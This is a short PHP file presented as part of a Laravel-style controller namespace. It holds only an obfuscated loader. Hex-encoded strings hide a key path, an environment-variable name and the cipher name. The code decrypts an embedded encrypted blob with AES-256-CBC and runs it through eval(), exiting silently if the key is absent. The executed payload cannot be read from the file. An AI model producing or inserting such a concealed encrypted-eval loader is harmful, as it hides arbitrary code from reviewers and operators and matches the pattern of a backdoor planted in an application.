<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('WlajhraNnSpQeR87+V8ipQ==');

$c=base64_decode(

'x7u1w1l1PxaxLodtTuasfmQEoo7ShQdEJ4Rge02XmTfrju6KfKU+LaCitsFYPJvLTAzF1ba4Be9v' .
'A0e/VSBwhGT2+Cp9KJR2AqAqBdrwRXJilUGOCe7+inBUeu6BkY5Pc/EuIYya73Ntj2OL0ZDJfHMg' .
'WukS1BV5PDTtdUMQZCnKldW9BqRIvT5bVmrDvxsKT/zH6afEzjAFd8L/7oxIwxLcNYK2ByCgZ0zZ' .
'v6V4opCUi+ITMImvO+WPk+nLRVHqAwY//Vrmixe0n+HJO0QQHw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

